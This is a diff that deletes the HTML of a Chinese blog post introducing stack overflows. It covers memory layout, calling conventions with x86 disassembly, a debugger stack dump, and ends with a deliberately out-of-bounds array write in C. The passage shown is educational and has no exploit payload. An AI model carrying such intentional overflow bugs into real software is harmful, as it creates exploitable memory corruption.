@@ -1,1409 +1,270 @@
-<!DOCTYPE html>
-<html lang="zh">
-    <!-- title -->
-
-
-    
-
-<!-- keywords -->
-
-
-
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="symlPigeon">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="symlPigeon">
-    
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content="栈溢出应该算是一个十分基础的东西了，之前自己学过，然后过了一阵子就忘了……这次争取别忘掉。 栈怎么就溢出了 我们在数据结构中所学的栈是一种特殊的数据结构，它满足先进后出，后进先出的特性。 在Linux下，一个程序的地址空间实际上是这样的形态（当然我们并不需要去考虑操作系统层面和硬件层面的虚拟内存等问题）：  其中有两段，即stack和heap，是可以动态变化的。stack对应了我们所说的栈，而he">
-<meta property="og:type" content="article">
-<meta property="og:title" content="关于栈溢出的一些东西（基本的）">
-<meta property="og:url" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/index.html">
-<meta property="og:site_name" content="symlpigeon&#39;s little gensokyo">
-<meta property="og:description" content="栈溢出应该算是一个十分基础的东西了，之前自己学过，然后过了一阵子就忘了……这次争取别忘掉。 栈怎么就溢出了 我们在数据结构中所学的栈是一种特殊的数据结构，它满足先进后出，后进先出的特性。 在Linux下，一个程序的地址空间实际上是这样的形态（当然我们并不需要去考虑操作系统层面和硬件层面的虚拟内存等问题）：  其中有两段，即stack和heap，是可以动态变化的。stack对应了我们所说的栈，而he">
-<meta property="og:locale">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/mem_org.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/stack_of_inc.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/stack_of_inc_after_leave.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/bad_test_asm1.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/bad_test_asm2.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/bad_test_stack.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/bad_test_corrupt_stack.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/stack_corrupt_chains.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/gets_stack_overflow.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/test_gets1.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/test_gets2.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/gets_exp.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/ret2shellcode.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/ret2shellcode_offset.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/ret2shellcode_explain.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/ropchain.jpg">
-<meta property="og:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/rop_exp.jpg">
-<meta property="article:published_time" content="2022-03-28T13:29:58.000Z">
-<meta property="article:modified_time" content="2022-03-29T15:20:21.959Z">
-<meta property="article:author" content="symlPigeon">
-<meta property="article:tag" content="Pwn">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/mem_org.jpg">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" href="/assets/favicon.ico">
-    
-    <title>关于栈溢出的一些东西（基本的） · syml&#39;s little gensokyo</title>
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-    (function (w) {
-        'use strict'
-        // rel=preload support test
-        if (!w.loadCSS) {
-            w.loadCSS = function () {}
-        }
-        // define on the loadCSS obj
-        var rp = (loadCSS.relpreload = {})
-        // rel=preload feature support test
-        // runs once and returns a function for compat purposes
-        rp.support = (function () {
-            var ret
-            try {
-                ret = w.document.createElement('link').relList.supports('preload')
-            } catch (e) {
-                ret = false
-            }
-            return function () {
-                return ret
-            }
-        })()
-
-        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-        // then change that media back to its intended value on load
-        rp.bindMediaToggle = function (link) {
-            // remember existing media attr for ultimate state, or default to 'all'
-            var finalMedia = link.media || 'all'
-
-            function enableStylesheet() {
-                link.media = finalMedia
-            }
-
-            // bind load handlers to enable media
-            if (link.addEventListener) {
-                link.addEventListener('load', enableStylesheet)
-            } else if (link.attachEvent) {
-                link.attachEvent('onload', enableStylesheet)
-            }
-
-            // Set rel and non-applicable media type to start an async request
-            // note: timeout allows this to happen async to let rendering continue in IE
-            setTimeout(function () {
-                link.rel = 'stylesheet'
-                link.media = 'only x'
-            })
-            // also enable media after 3 seconds,
-            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-            setTimeout(enableStylesheet, 3000)
-        }
-
-        // loop through link elements in DOM
-        rp.poly = function () {
-            // double check this to prevent external calls from running
-            if (rp.support()) {
-                return
-            }
-            var links = w.document.getElementsByTagName('link')
-            for (var i = 0; i < links.length; i++) {
-                var link = links[i]
-                // qualify links to those with rel=preload and as=style attrs
-                if (
-                    link.rel === 'preload' &&
-                    link.getAttribute('as') === 'style' &&
-                    !link.getAttribute('data-loadcss')
-                ) {
-                    // prevent rerunning on link
-                    link.setAttribute('data-loadcss', true)
-                    // bind listeners to toggle media back
-                    rp.bindMediaToggle(link)
-                }
-            }
-        }
-
-        // if unsupported, run the polyfill
-        if (!rp.support()) {
-            // run once at least
-            rp.poly()
-
-            // rerun poly on an interval until onload
-            var run = w.setInterval(rp.poly, 500)
-            if (w.addEventListener) {
-                w.addEventListener('load', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            } else if (w.attachEvent) {
-                w.attachEvent('onload', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            }
-        }
-
-        // commonjs
-        if (typeof exports !== 'undefined') {
-            exports.loadCSS = loadCSS
-        } else {
-            w.loadCSS = loadCSS
-        }
-    })(typeof global !== 'undefined' ? global : this)
-</script>
-
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
-    }
-
-    body {
-        margin: 0;
-    }
-
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
-
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
-
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
-
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-</style>
-
-    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
-    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
-    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
-    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
-    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
-    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
-    <!-- algolia -->
-    
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
-        <script async src="https://www.googletagmanager.com/gtag/js?id=G-EDRLRX5SK9"></script>
-        <script>
-            window.dataLayer = window.dataLayer || [];
-            function gtag(){dataLayer.push(arguments);}
-            gtag('js', new Date());
-
-            gtag('config', 'G-EDRLRX5SK9');
-        </script>
-    
-    
-<!-- hexo injector head_end start -->
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><style type="text/css">
-.spoiler {
-  display: inline-flex;
-}
-p.spoiler {
-  display: flex;
-}
-.spoiler a {
-  pointer-events: none;
-}
-.spoiler-blur, .spoiler-blur > * {
-  transition: text-shadow .5s ease;
-}
-.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
-  color: rgba(0, 0, 0, 0);
-  background-color: rgba(0, 0, 0, 0);
-  text-shadow: 0 0 10px grey;
-  cursor: pointer;
-}
-.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
-  text-shadow: 0 0 5px grey;
-}
-.spoiler-box, .spoiler-box > * {
-  transition: color .5s ease,
-  background-color .5s ease;
-}
-.spoiler .spoiler-box, .spoiler .spoiler-box > * {
-  color: black;
-  background-color: black;
-  text-shadow: none;
-}</style><meta name="generator" content="Hexo 5.4.1"></head>
-
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ == undefined) {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js" />')
-        }
-    </script>
-    
-        <body class="post-body">
-    
-        <!-- header -->
-        <header class="header-page header-page-mobile">
-    <!-- top read progress line -->
-    <div class="header-element">
-        <div class="read-progress"></div>
-    </div>
-    <!-- sidebar menu button -->
-    <div class="header-element">
-        
-            <div class="header-sidebar-menu">
-        
-            
-                <div style="padding-left: 1px;">&#xe775;</div>
-            
-        </div>
-    </div>
-    <!-- header actions -->
-    <div class="header-actions">
-        <!-- theme mode switch button -->
-        <span class="header-theme-btn header-element">
-            <i class="fas fa-adjust"></i>
-        </span>
-        <!-- back to home page text -->
-        <span class="home-link header-element">
-            <a href=/>symlpigeon's little gensokyo</a>
-        </span>
-    </div>
-    <!-- toggle banner for post layout -->
-    
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">symlpigeon&#39;s little gensokyo</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">关于栈溢出的一些东西（基本的）</a>
-            </div>
-        </div>
-    
-</header>
-
-        <!-- fixed footer -->
-        <footer class="footer-fixed">
-    <!-- back to top button -->
-    <div class="footer-fixed-element">
-        
-            <div class="back-top back-top-hidden">
-        
-        
-            <div>&#xe639;</div>
-        
-        </div>
-    </div>
-</footer>
-
-        <!-- wrapper -->
-        <div class="wrapper">
-            <div class="site-intro" style="
-
-
-
-
-
-
-
-    height:50vh;
-
-">
-    
-    <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
-            
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-                关于栈溢出的一些东西（基本的）
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-                
-            <!-- 404 -->
-            
-        </p>
-        <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        
-        
-            
-        
-        
-        <span class="post-category" data-categories="二进制"">
-            <i class="fas fa-folder post-category-icon"></i>
-            <span class="post-category-text">
-                二进制
-            </span>
-        </span>
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Pwn">Pwn</a>
-    
-</div>
-
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">5.6k</span>阅读时长: <span class="post-count reading-time">23 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2022/03/28</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
-        
-    </div>
-</div>
-
-            <script>
-  // get user agent
-  function getBrowserVersions() {
-    var u = window.navigator.userAgent
-    return {
-      userAgent: u,
-      trident: u.indexOf('Trident') > -1, //IE内核
-      presto: u.indexOf('Presto') > -1, //opera内核
-      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-      iPad: u.indexOf('iPad') > -1, //是否为iPad
-      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
-    }
-  }
-  var browser = {
-    versions: getBrowserVersions(),
-  }
-  console.log('userAgent: ' + browser.versions.userAgent)
-
-  // callback
-  function fontLoaded() {
-    console.log('font loaded')
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document
-        .getElementsByClassName('intro-title')[0]
-        .classList.add('intro-fade-in')
-      document
-        .getElementsByClassName('intro-subtitle')[0]
-        .classList.add('intro-fade-in')
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in')
-      }
-    }
-  }
-
-  // UC不支持跨域，所以直接显示
-  function asyncCb() {
-    if (browser.versions.uc) {
-      console.log('UCBrowser')
-      fontLoaded()
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular'],
-        },
-        loading: function () {
-          // 所有字体开始加载
-          // console.log('font loading');
-        },
-        active: function () {
-          // 所有字体已渲染
-          fontLoaded()
-        },
-        inactive: function () {
-          // 字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout')
-          fontLoaded()
-        },
-        timeout: 5000, // Set the timeout to two seconds
-      })
-    }
-  }
-
-  function asyncErr() {
-    console.warn('script load from CDN failed, will load local script')
-  }
-
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document,
-      t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0]
-    o.src = u
-    if (cb) {
-      o.addEventListener(
-        'load',
-        function (e) {
-          cb(null, e)
-        },
-        false
-      )
-    }
-    if (err) {
-      o.addEventListener(
-        'error',
-        function (e) {
-          err(null, e)
-        },
-        false
-      )
-    }
-    s.parentNode.insertBefore(o, s)
-  }
-
-  var asyncLoadWithFallBack = function (arr, success, reject) {
-    var currReject = function () {
-      reject()
-      arr.shift()
-      if (arr.length) async(arr[0], success, currReject)
-    }
-
-    async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack(
-    [
-      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
-      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
-      "/lib/webfontloader.min.js",
-    ],
-    asyncCb,
-    asyncErr
-  )
-</script>
-
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-            <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <p><em>栈溢出应该算是一个十分基础的东西了，之前自己学过，然后过了一阵子就忘了……这次争取别忘掉。</em></p>
-<h1 id="栈怎么就溢出了">栈怎么就溢出了</h1>
-<p>我们在数据结构中所学的栈是一种特殊的数据结构，它满足先进后出，后进先出的特性。</p>
-<p>在Linux下，一个程序的地址空间实际上是这样的形态（当然我们并不需要去考虑操作系统层面和硬件层面的虚拟内存等问题）：</p>
-<p><img src="mem_org.jpg" /></p>
-<p>其中有两段，即stack和heap，是可以动态变化的。stack对应了我们所说的栈，而heap对应了我们所说的堆。</p>
-<p>从图像中也可以看出来，栈的增长是从高地址到低地址的——也就是说，栈底出于高地址的位置，而栈顶处在低地址的位置。x86寄存器中的栈指针即esp，就指明了栈顶的位置，而栈基指针ebp则指明了栈底的位置。</p>
-<p>一般来说，在函数中定义的局部变量等，都会被定义在栈上，而通过<code>malloc</code>分配的变量对应的空间则是在堆上。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>]; <span class="comment">// 在栈上</span></span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">100</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>)); <span class="comment">// 在堆上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="函数的调用还有返回发生了什么">函数的调用还有返回发生了什么</h2>
-<p>每当我们去调用一个函数的时候，我们都需要遵循一定的规则，这个规则也就是调用惯例。<a
-href="/2022/02/15/re-call/">之前</a>专门详细分析了几种调用惯例，这里不多说了，直接就拿最简单的来说。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inc</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b = a + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    a = inc(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在这段程序中，在调用函数<code>inc(a)</code>之前，<code>main()</code>函数做了这样的事情：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">11b2:       c7 <span class="number">45</span> f4 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="number">0x1</span></span><br><span class="line">            <span class="comment">; 将变量a赋值为1（这一步实际上并不属于函数调用的部分）</span></span><br><span class="line"></span><br><span class="line">11b9:       ff <span class="number">75</span> f4                <span class="keyword">push</span>   <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</span><br><span class="line">            <span class="comment">; 将参数压栈（CDECL调用）</span></span><br><span class="line">11bc:       e8 cc ff ff ff          <span class="keyword">call</span>   <span class="number">118d</span> &lt;<span class="keyword">inc</span>&gt;</span><br><span class="line">            <span class="comment">; 调用函数inc</span></span><br><span class="line">11c1:       <span class="number">83</span> c4 <span class="number">04</span>                <span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x4</span></span><br><span class="line">            <span class="comment">; 函数返回之后清理栈（栈顶加4就相当于把前面push DWORD PTR [ebp-0xc]这句占据的空间顶回来）</span></span><br></pre></td></tr></table></figure>
-<p>在x86中，<code>call addr</code>这条指令做的是这样的事情：将当前指令的下一条指令（上文中的add
-esp,0x4这句指令）地址压入栈中，并掉转到<code>addr</code>对应的地址。</p>
-<p>执行完了上面的指令之后，程序就会跳转进入<code>inc()</code>函数中。我们来看这个函数的指令：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">; 下面的两条指令也就是所谓的函数序言</span></span><br><span class="line"><span class="number">118d</span>:       <span class="number">55</span>                      <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br><span class="line">        <span class="comment">; 将现在的ebp（实际上也就是之前main函数的栈基址）压入栈中</span></span><br><span class="line">118e:       <span class="number">89</span> e5                   <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">        <span class="comment">; 将ebp设定为esp，也就是现在的栈顶就是现在的栈基址</span></span><br><span class="line"></span><br><span class="line"><span class="number">1190</span>:       <span class="number">83</span> ec <span class="number">10</span>                <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span></span><br><span class="line">        <span class="comment">; 开辟现在inc函数的栈空间（实际上多开了一部分空间）</span></span><br></pre></td></tr></table></figure>
-<p>在执行完了这些部分之后，函数的堆栈实际上是这个样子的：</p>
-<p><img src="stack_of_inc.jpg" /></p>
-<p>接下来的几条指令负责计算函数的结果：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1193</span>:       8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x8</span>]</span><br><span class="line">    <span class="comment">; 从栈上获取参数</span></span><br><span class="line"><span class="number">1196</span>:       <span class="number">83</span> c0 <span class="number">01</span>                <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">1199</span>:       <span class="number">89</span> <span class="number">45</span> fc                <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="built_in">eax</span></span><br><span class="line">    <span class="comment">; 实际上DWORD PTR [ebp-0x4]这个位置就对应了函数inc中的局部变量b</span></span><br><span class="line">119c:       8b <span class="number">45</span> fc                <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>]</span><br></pre></td></tr></table></figure>
-<p>接下来的部分就是函数最后的一些操作：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">119f:       c9                      <span class="keyword">leave</span>  </span><br><span class="line">11a0:       c3                      <span class="keyword">ret</span>   </span><br></pre></td></tr></table></figure>
-<p><code>leave</code>指令等价于<code>mov esp, ebp</code>并<code>pop ebp</code>。这条指令的作用在于清楚函数的栈，执行完之后，函数的栈是现在这样的情况：</p>
-<p><img src="stack_of_inc_after_leave.jpg" /></p>
-<p>注意现在栈顶上的值是函数的返回地址——也就是说，下一步执行<code>ret</code>语句之后，程序就会跳转到这个返回地址（当然同时会把栈顶的元素弹出）。</p>
-<p>接下来main函数会执行一部分的清栈工作等等（实际上对于stdcall和fastcall又是不一样的情况）。</p>
-<h2 id="如果栈塞不下了">如果栈塞不下了……</h2>
-<p>上面的例子中，函数里的局部变量是一个4字节的int类型。一个问题在于，如果函数里面有一个数组，那么在内存中是怎么样的布局？</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们来测试一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 16</span><br><span class="line">00:0000│ esp 0xffffd530 —▸ 0xf7fbd3e0 —▸ 0xf7d4a000 ◂— 0x464c457f</span><br><span class="line">01:0004│     0xffffd534 ◂— 0x0</span><br><span class="line">02:0008│     0xffffd538 ◂— 0xbfebfbff</span><br><span class="line">03:000c│     0xffffd53c ◂— 0x1</span><br><span class="line">04:0010│     0xffffd540 ◂— 0x2</span><br><span class="line">05:0014│     0xffffd544 ◂— 0x3</span><br><span class="line">06:0018│     0xffffd548 ◂— 0x4</span><br><span class="line">07:001c│     0xffffd54c ◂— 0x5</span><br><span class="line">08:0020│ ebp 0xffffd550 —▸ 0xffffd558 —▸ 0xf7ffcb80 (_rtld_local_ro) ◂— 0x0</span><br><span class="line">09:0024│     0xffffd554 —▸ 0x565561b1 (main+8) ◂— mov    eax, 0</span><br></pre></td></tr></table></figure>
-<p>可以看出来，栈上面的这个数组增长的顺序是和栈的增长方向是反过来的——数组中前面的元素在靠近栈顶的地方，后面的元素在靠近栈底的地方。</p>
-<p>这样一个问题就来了，如果这个局部变量占了实际上超过了我们给它大小的空间会发生什么事情？</p>
-<p>我们可以试一下。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bad_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    a[<span class="number">5</span>] = <span class="number">6</span>; <span class="comment">// 实际上这就是一个常见的数组越界访问的问题。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">    bad_test();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行一下，然后：</p>
